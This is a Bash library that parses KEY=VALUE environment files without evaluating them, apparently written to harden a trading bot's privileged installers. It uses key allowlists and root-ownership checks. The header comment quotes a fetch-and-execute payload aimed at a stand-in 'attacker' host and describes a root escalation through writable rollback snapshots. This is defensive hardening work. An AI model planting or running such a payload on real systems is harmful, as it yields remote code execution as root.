# shellcheck shell=bash
# Strict, non-evaluating reader for KEY=VALUE environment files.
#
# WHY THIS EXISTS
#
# The privileged installers previously did:
#
#     set -a
#     source "$ENV_FILE"
#     set +a
#
# `source` makes Bash *interpret* the file. Every value is shell code, so a
# single line such as
#
#     COMMAND_HMAC_KEY=$(curl -s http://attacker/x | sh)
#
# executes as whatever user runs the installer. install_artifact.sh and
# install_monitoring.sh escalate through `as_root`, so that is root.
#
# The old mode check (`stat -c '%a' == 600`) constrained permissions but never
# ownership, and the rollback path sourced configuration snapshots under
# /var/lib/bitcoin-bot/config-snapshots, which oracle_setup.sh chowns to the
# unprivileged deployment user. Anyone able to write a snapshot could therefore
# execute arbitrary code as root during the next upgrade or rollback.
#
# These helpers never evaluate a value. Assignment uses `printf -v`, which
# writes the bytes literally, and every key is validated against a strict
# identifier pattern before it is used as a variable name.
#
# Regression coverage: tests/test_env_file_parser.py

env_file_fail() { echo "ERROR: $*" >&2; return 1; }

# Only configuration keys shipped in the bot or monitoring templates may enter
# a privileged process environment. This blocks process-control variables such
# as PATH, LD_PRELOAD, BASH_ENV and PYTHONHOME even when a deployment-user-owned
# rollback snapshot is tampered with.
env_file_key_allowed() {
  case "$1" in
    ACTIVE_PAIR|ACTIVE_PAIR_STATUS_PATH|AUDIT_LOG_BACKUPS|AUDIT_LOG_MAX_BYTES|\
    AUTO_BREAK_EVEN_TRIGGER_PCT|AUTO_CONFIRM|AUTO_PROTECTION_ENABLED|\
    AUTO_TIGHT_TRAIL_BIPS|BINANCE_API_KEY|BINANCE_API_SECRET|\
    BINANCE_HTTP_TIMEOUT_SECONDS|BINANCE_RECV_WINDOW_MS|BINANCE_REST_BASE|\
    BINANCE_SPOT_EXECUTION_PUBLIC_BASE|BINANCE_TIME_SYNC_MAX_RTT_MS|\
    BOT_DIRECTORY|BOT_GID|BOT_MODE|BOT_UID|BREAK_EVEN_SLIPPAGE_PCT|\
    BTC_PAIR_REGISTRY_TTL_SECONDS|BTC_QUOTE_ALLOWLIST|CALLBACK_TTL_SECONDS|\
    COINGECKO_API_KEY|COINGECKO_CONTEXT_ENABLED|\
    COINGECKO_MAX_MONTHLY_ATTEMPTS|COINGECKO_MAX_REQUESTS_PER_MINUTE|\
    COINMARKETCAP_API_KEY|COINMARKETCAP_CONTEXT_ENABLED|\
    COINMARKETCAP_MAX_MONTHLY_ATTEMPTS|COINMARKETCAP_MAX_REQUESTS_PER_MINUTE|\
    COMMAND_HMAC_KEY|COMMAND_MAX_AGE_SECONDS|COMMAND_RESULT_MAX_AGE_SECONDS|\
    COMMAND_RESULT_MAX_FILES|CONTAINER_STATUS_PATH|DEPLOY_STATUS_PATH|\
    EXECUTION_DATABASE_PATH|EXECUTION_MODE|EXECUTION_PNL_LEDGER_PATH|\
    EXTERNAL_MARKET_HTTP_TIMEOUT_SECONDS|EXTERNAL_MARKET_REFRESH_SECONDS|\
    EXTERNAL_MARKET_STALE_AFTER_SECONDS|FEE_PCT_PER_SIDE|FIXED_STOP_PCT|\
    FLOW_MIN_SPOT_IMBALANCE|FLOW_MIN_TAKER_BUY_RATIO|\
    FREQTRADE_API_JWT_SECRET|FREQTRADE_API_PASSWORD|FREQTRADE_API_USERNAME|\
    FREQTRADE_API_WS_TOKEN|FT_LOG_PATH|HTTP_TIMEOUT_SECONDS|\
    LIMIT_FILL_BUFFER_BIPS|LIVE_EVIDENCE_PUBLIC_KEY|\
    LIVE_EVIDENCE_RECHECK_SECONDS|LIVE_MAX_DRAWDOWN_ACCOUNT|\
    LIVE_MIN_BACKTEST_FEE|LIVE_MIN_BACKTEST_TRADES|LIVE_MIN_PROFIT_FACTOR|\
    LIVE_MIN_PROFIT_TOTAL|LIVE_TRADING_ENABLED|LOG_LEVEL|\
    MAX_CANDLE_AGE_SECONDS|MAX_ENTRY_OPEN_SECONDS|MAX_FLOW_AGE_SECONDS|\
    MAX_SIGNAL_AGE_SECONDS|MAX_STOPOUTS_GLOBAL_DAY|\
    MAX_STOPOUTS_PER_PAIR_DAY|MONEYFLOW_DEPTH_BAND_BPS|\
    MONEYFLOW_DEPTH_LIMIT|MONEYFLOW_HEALTH_PATH|MONEYFLOW_REFRESH_SECONDS|\
    MONEYFLOW_STATUS_PATH|MONEYFLOW_TRADE_LIMIT|MONITOR_ALLOWED_IPS|\
    MONITOR_AUDIT_LOG|MONITOR_BIND_HOST|MONITOR_ENABLE_DOCS|MONITOR_ENABLED|\
    MONITOR_MONEYFLOW_MAX_AGE_SECONDS|MONITOR_PORT|\
    MONITOR_RATE_LIMIT_PER_MINUTE|MONITOR_SHARED_ROOT|MONITOR_TOKEN|\
    MONITOR_URL|PAIR_COOLDOWN_SECONDS|PROTECTION_MODE|\
    PUBLIC_HTTP_MAX_ATTEMPTS|RELEASE_TAG|REQUIRE_FLOW_CONTEXT|\
    REQUIRE_MATCHING_FUTURES|SHARED_HOST_PATH|SIDECAR_HEALTH_PATH|\
    SIDECAR_RELEASE_HASH|SIGNAL_ARCHIVE_MAX_FILES|SIGNAL_DATABASE_PATH|\
    SIGNAL_HMAC_KEY|SPOT_FILTER_MAX_AGE_SECONDS|SQLITE_BACKUP_INTERVAL_SECONDS|\
    SQLITE_BACKUP_RETAIN|TAKE_PROFIT_PCT|TELEGRAM_BOT_TOKEN|\
    TELEGRAM_HEALTH_PATH|TELEGRAM_MONITOR_BOT_TOKEN|\
    TELEGRAM_MONITOR_CHAT_ID|TELEGRAM_OWNER_CHAT_ID|\
    TELEGRAM_REPORTS_ENABLED|TRADE_SIZE_QUOTE|TRAILING_DELTA_BIPS|\
    USER_STREAM_HEALTH_PATH|VALIDATION_STATUS_PATH) return 0 ;;
    *) env_file_fail "environment key is not shipped in an approved template: $1"; return 1 ;;
  esac
}

# env_file_require_trusted FILE
#
# A file that a privileged process is about to read must be a real file, not a
# symlink, owned by root, and not writable by group or other.
env_file_require_trusted() {
  local file=$1 owner mode
  [[ -f "$file" && ! -L "$file" ]] || {
    env_file_fail "environment file is missing or a symlink: $file"; return 1; }
  owner=$(stat -c '%u' "$file" 2>/dev/null) || {
    env_file_fail "cannot stat environment file: $file"; return 1; }
  [[ "$owner" == "0" ]] || {
    env_file_fail "environment file must be owned by root (uid 0), found uid $owner: $file"
    return 1; }
  mode=$(stat -c '%a' "$file" 2>/dev/null)
  mode=${mode: -3}
  case "$mode" in
    600|640|400|440) ;;
    *) env_file_fail "environment file must not be group- or world-writable (mode $mode): $file"
       return 1 ;;
  esac
  return 0
}

# _env_file_unquote NAME
#
# Strips one balanced layer of single or double quotes. Nothing is expanded.
_env_file_unquote() {
  local __name=$1 __v=${!1}
  if [[ ${__v:0:1} == "'" || ${__v:0:1} == '"' \
     || ${__v: -1} == "'" || ${__v: -1} == '"' ]]; then
    [[ ${#__v} -ge 2 && ${__v:0:1} == "${__v: -1}" ]] || {
      env_file_fail "environment value has unmatched quotes"; return 1; }
  fi
  if [[ ${#__v} -ge 2 ]]; then
    if [[ ${__v:0:1} == '"' && ${__v: -1} == '"' ]]; then
      __v=${__v:1:${#__v}-2}
    elif [[ ${__v:0:1} == "'" && ${__v: -1} == "'" ]]; then
      __v=${__v:1:${#__v}-2}
    fi
  fi
  printf -v "$__name" '%s' "$__v"
}

# env_file_get FILE KEY
#
# Prints the literal value of KEY, or returns 1 when absent. The last
# Duplicate assignments are rejected so a privileged caller cannot observe a
# different effective value from another parser or validation step.
env_file_get() {
  local file=$1 want=$2 line key value found=1 result=''
  local -A seen=()
  [[ "$want" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]] || {
    env_file_fail "invalid environment key requested: $want"; return 1; }
  env_file_key_allowed "$want" || return 1
  while IFS= read -r line || [[ -n "$line" ]]; do
    line=${line%$'\r'}
    line=${line#"${line%%[![:space:]]*}"}
    [[ -z "$line" || "$line" == '#'* ]] && continue
    [[ "$line" == *=* ]] || continue
    key=${line%%=*}
    key=${key%"${key##*[![:space:]]}"}
    [[ "$key" =~ ^[A-Z][A-Z0-9_]*$ ]] || {
      env_file_fail "$file has an invalid key name: $key"; return 1; }
    env_file_key_allowed "$key" || return 1
    [[ -z ${seen[$key]+x} ]] || {
      env_file_fail "$file contains duplicate key: $key"; return 1; }
    seen[$key]=1
    [[ "$key" == "$want" ]] || continue
    value=${line#*=}
    _env_file_unquote value || return 1
    result=$value
    found=0
  done < "$file"
  [[ $found -eq 0 ]] || return 1
  printf '%s' "$result"
  return 0
}

# env_file_pairs FILE
#
# Emits NUL-separated KEY=VALUE records for use as literal `env` arguments:
#
#     while IFS= read -r -d '' kv; do args+=("$kv"); done < <(env_file_pairs f)
#     env -i "${args[@]}" some-command
#
# `env` treats each argument as data, so this replaces `set -a; source FILE`
# inside a clean-environment subshell without ever evaluating a value.
env_file_pairs() {
  local file=$1 line key value lineno=0
  local -A seen=()
  while IFS= read -r line || [[ -n "$line" ]]; do
    lineno=$((lineno + 1))
    line=${line%$'\r'}
    line=${line#"${line%%[![:space:]]*}"}
    [[ -z "$line" || "$line" == '#'* ]] && continue
    [[ "$line" == *=* ]] || {
      env_file_fail "$file line $lineno is not KEY=VALUE"; return 1; }
    key=${line%%=*}
    key=${key%"${key##*[![:space:]]}"}
    [[ "$key" =~ ^[A-Z][A-Z0-9_]*$ ]] || {
      env_file_fail "$file line $lineno has an invalid key name"; return 1; }
    env_file_key_allowed "$key" || return 1
    [[ -z ${seen[$key]+x} ]] || {
      env_file_fail "$file contains duplicate key: $key"; return 1; }
    seen[$key]=1
    value=${line#*=}
    _env_file_unquote value || return 1
    printf '%s=%s\0' "$key" "$value"
  done < "$file"
  return 0
}

# env_file_load FILE
#
# Exports every well-formed KEY=VALUE pair, literally. A malformed key is
# rejected outright rather than skipped, so a corrupt or tampered file fails
# closed instead of silently loading a partial configuration.
env_file_load() {
  local file=$1 line key value lineno=0
  local -A seen=()
  while IFS= read -r line || [[ -n "$line" ]]; do
    lineno=$((lineno + 1))
    line=${line%$'\r'}
    line=${line#"${line%%[![:space:]]*}"}
    [[ -z "$line" || "$line" == '#'* ]] && continue
    [[ "$line" == *=* ]] || {
      env_file_fail "$file line $lineno is not KEY=VALUE"; return 1; }
    key=${line%%=*}
    key=${key%"${key##*[![:space:]]}"}
    [[ "$key" =~ ^[A-Z][A-Z0-9_]*$ ]] || {
      env_file_fail "$file line $lineno has an invalid key name"; return 1; }
    env_file_key_allowed "$key" || return 1
    [[ -z ${seen[$key]+x} ]] || {
      env_file_fail "$file contains duplicate key: $key"; return 1; }
    seen[$key]=1
    value=${line#*=}
    _env_file_unquote value || return 1
    printf -v "$key" '%s' "$value"
    export "${key?}"
  done < "$file"
  return 0
}
